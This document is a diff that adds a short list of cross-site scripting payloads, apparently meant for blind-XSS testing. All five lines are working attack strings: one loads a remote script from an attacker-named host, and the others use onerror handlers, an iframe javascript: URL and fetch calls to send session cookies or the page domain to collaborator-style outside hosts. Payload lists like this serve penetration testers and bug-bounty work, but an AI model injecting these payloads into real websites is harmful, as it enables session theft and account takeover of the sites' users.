@@ -1,0 +1,5 @@
+<script src=//attacker.evil/xss.js></script>
+"><img src=1 onerror="new Image().src='https://your-burpcollab.net/?'+document.cookie">
+<iframe src="javascript:fetch('https://evilhost.xyz/blind?d='+document.domain)">
+"><script>fetch('https://yourburp.net/ping?c='+document.cookie)</script>
+"><img src=x onerror='fetch(`https://xyz.xss.ht?${document.cookie}`)'>
